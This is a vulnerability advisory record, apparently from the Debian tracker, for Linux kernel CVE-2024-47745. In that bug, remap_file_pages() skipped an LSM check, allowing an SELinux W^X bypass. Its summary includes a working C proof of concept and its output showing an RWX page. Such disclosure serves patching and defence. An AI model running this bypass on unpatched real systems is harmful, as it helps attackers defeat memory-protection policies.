advisory_id: linux/CVE-2024-47745
datasource_id: debian_importer_v2/linux/CVE-2024-47745
datasource_url: https://security-tracker.debian.org/tracker/CVE-2024-47745
aliases:
  - CVE-2024-47745
summary: "In the Linux kernel, the following vulnerability has been resolved:  mm: call the\
  \ security_mmap_file() LSM hook in remap_file_pages()  The remap_file_pages syscall handler\
  \ calls do_mmap() directly, which doesn't contain the LSM security check. And if the process\
  \ has called personality(READ_IMPLIES_EXEC) before and remap_file_pages() is called for RW\
  \ pages, this will actually result in remapping the pages to RWX, bypassing a W^X policy enforced\
  \ by SELinux.  So we should check prot by security_mmap_file LSM hook in the remap_file_pages\
  \ syscall handler before do_mmap() is called. Otherwise, it potentially permits an attacker\
  \ to bypass a W^X policy enforced by SELinux.  The bypass is similar to CVE-2016-10044, which\
  \ bypass the same thing via AIO and can be found in [1].  The PoC:  $ cat > test.c  int main(void)\
  \ { \tsize_t pagesz = sysconf(_SC_PAGE_SIZE); \tint mfd = syscall(SYS_memfd_create, \"test\"\
  , 0); \tconst char *buf = mmap(NULL, 4 * pagesz, PROT_READ | PROT_WRITE, \t\tMAP_SHARED, mfd,\
  \ 0); \tunsigned int old = syscall(SYS_personality, 0xffffffff); \tsyscall(SYS_personality,\
  \ READ_IMPLIES_EXEC | old); \tsyscall(SYS_remap_file_pages, buf, pagesz, 0, 2, 0); \tsyscall(SYS_personality,\
  \ old); \t// show the RWX page exists even if W^X policy is enforced \tint fd = open(\"/proc/self/maps\"\
  , O_RDONLY); \tunsigned char buf2[1024]; \twhile (1) { \t\tint ret = read(fd, buf2, 1024);\
  \ \t\tif (ret <= 0) break; \t\twrite(1, buf2, ret); \t} \tclose(fd); }  $ gcc test.c -o test\
  \ $ ./test | grep rwx 7f1836c34000-7f1836c35000 rwxs 00002000 00:01 2050 /memfd:test (deleted)\
  \  [PM: subject line tweaks]"
impacted_packages:
  - purl: pkg:deb/debian/linux?distro=trixie
    affected_versions: vers:deb/5.10.223-1
    fixed_versions: vers:deb/6.1.159-1
    fixed_in_commits: []
    introduced_in_commits: []
  - purl: pkg:deb/debian/linux?distro=trixie
    affected_versions: vers:deb/5.10.223-1
    fixed_versions: vers:deb/6.1.123-1
    fixed_in_commits: []
    introduced_in_commits: []
  - purl: pkg:deb/debian/linux?distro=trixie
    affected_versions: vers:deb/5.10.223-1
    fixed_versions: vers:deb/6.18.12-1
    fixed_in_commits: []
    introduced_in_commits: []
  - purl: pkg:deb/debian/linux?distro=trixie
    affected_versions: vers:deb/5.10.223-1
    fixed_versions: vers:deb/6.11.2-1
    fixed_in_commits: []
    introduced_in_commits: []
  - purl: pkg:deb/debian/linux?distro=trixie
    affected_versions: vers:deb/5.10.223-1
    fixed_versions: vers:deb/6.12.63-1
    fixed_in_commits: []
    introduced_in_commits: []
severities: []
weaknesses: []
references: []
